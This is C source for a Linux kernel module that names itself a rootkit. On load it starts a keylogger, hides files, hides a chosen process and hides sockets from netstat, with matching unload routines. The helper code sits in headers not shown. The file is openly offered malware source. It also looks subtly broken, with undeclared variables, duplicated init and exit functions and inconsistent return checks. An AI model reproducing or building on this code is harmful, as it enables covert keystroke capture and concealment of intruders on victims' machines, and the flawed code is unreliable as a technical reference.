#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include "file.h"
#include "keylogger.h"
#include "sockets.h"
#include "process.h" 
static char *PortToHide="0x1f90";
//module_param(PortToHide, charp, 0000);
static char *ProcIdToHide= "8080";
//module_param(ProcIdToHide, charp, 0000);
int settings[5] = {1,1,1,1,1};
static int arr_argc=5;
module_param_array(settings, int, &arr_argc, 0000);
void __exit MODUNLOAD1(void)
{
    
        /*keylogger*/
    StopKeylogging();    
    printk(KERN_INFO "rk:Run keylogger retured: %d", ret);

        /*HideFiles*/
    StopHideFile();
        
    printk(KERN_INFO "rk:Run HideFile retured: %d", ret);

        /*HideProcess*/
    StopProcessHide();
        
    printk(KERN_INFO "rk:Run ProcessHide retured: %d", ret);

   
        /*HideSockets*/
    StopHideSocketsFromNetstat();
        
    printk(KERN_INFO "rk:Run HideSockets retured: %d", ret);
   
}
int __init MODLOAD1(void){
    int ret =StartKeylogger();
    if(!ret){
            printk(KERN_INFO "rk:Error in keylogger, retured: %d", ret);
            printk(KERN_INFO "rk:Stop keylogger");
            printk(KERN_INFO "rk:Stop R00tKit");

            return -1;
        }
        printk(KERN_INFO "rk:Run keylogger successfully");
    ret = HideFile();
    if(!ret){
            printk(KERN_INFO "rk:Error in HideFile, retured: %d", ret);
            printk(KERN_INFO "rk:Stop HideFile");
            printk(KERN_INFO "rk:Stop R00tKit");

            return -1;
        }
    printk(KERN_INFO "rk:Run HideFile successfully");
    ret = ProcessHide(ProcIdToHide);
    if(!ret){
            printk(KERN_INFO "rk:Error in ProcessHide, retured: %d", ret);
            printk(KERN_INFO "rk:Stop ProcessHide");
            printk(KERN_INFO "rk:Stop R00tKit");
            return -1;
        }
    printk(KERN_INFO "rk:Run ProcessHide successfully");
    ret = HideSocketsFromNetstat();
    if(!ret){
            printk(KERN_INFO "rk:Error in HideSocketsFromNetstat, retured: %d", ret);
            printk(KERN_INFO "rk:Stop HideSockets");
            printk(KERN_INFO "rk:Stop R00tKit");

            return -1;
        }
        printk(KERN_INFO "rk:Run HideSockets successfully");
        printk(KERN_INFO "rk:Run the whole rootkit successfully!");

    return ret;
    }
int __init MODLOAD(void)
{
    if(1/*settings[0]*/)
    {
        /*keylogger*/
        ret = StartKeylogger();
        if(!ret){
            printk(KERN_INFO "rk:Error in keylogger, retured: %d", ret);
            printk(KERN_INFO "rk:Stop keylogger");
            printk(KERN_INFO "rk:Stop R00tKit");

            return -1;
        }
        printk(KERN_INFO "rk:Run keylogger retured: %d", ret);

    }
    if(1/*settings[1]*/)
    {
        /*HideFiles*/
        ret = HideFile();
        if(ret != 1){
            printk(KERN_INFO "rk:Error in HideFile, retured: %d", ret);
            printk(KERN_INFO "rk:Stop HideFile");
            printk(KERN_INFO "rk:Stop R00tKit");
            return -1;
        }
        printk(KERN_INFO "rk:Run HideFile retured: %d", ret);

    }
    if(1/*settings[2]*/)
    {
         /*HideProcess*/
        ret = ProcessHide(ProcIdToHide);
        if(ret != 1){
            printk(KERN_INFO "rk:Error in ProcessHide, retured: %d", ret);
            printk(KERN_INFO "rk:Stop ProcessHide");
            printk(KERN_INFO "rk:Stop R00tKit");
            return -1;
        }
        printk(KERN_INFO "rk:Run ProcessHide retured: %d", ret);

    }
    if(1/*settings[3]*/)
    {
        /*HideSockets*/
        ret = HideSocketsFromNetstat();
        if(ret != 1){
            printk(KERN_INFO "rk:Error in HideSocketsFromNetstat, retured: %d", ret);
            printk(KERN_INFO "rk:Stop HideSockets");
            printk(KERN_INFO "rk:Stop R00tKit");
            return -1;
        }
        printk(KERN_INFO "rk:Run HideSockets retured: %d", ret);
    }
    return ret;
    
}
void __exit MODUNLOAD(void)
{
    if(settings[0])
    {
        /*keylogger*/
        StopKeylogging();
        
        printk(KERN_INFO "rk:Run keylogger retured: %d", ret);

    }
    if(settings[1])
    {
        /*HideFiles*/
        StopHideFile();
        
        printk(KERN_INFO "rk:Run HideFile retured: %d", ret);

    }
    if(settings[2])
    {
         /*HideProcess*/
        StopProcessHide();
        
        printk(KERN_INFO "rk:Run ProcessHide retured: %d", ret);

    }
    if(settings[3])
    {
        /*HideSockets*/
        StopHideSocketsFromNetstat();
        
        printk(KERN_INFO "rk:Run HideSockets retured: %d", ret);
    }
}
module_init(MODLOAD1);
module_exit(MODUNLOAD1);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheH0r!zen");
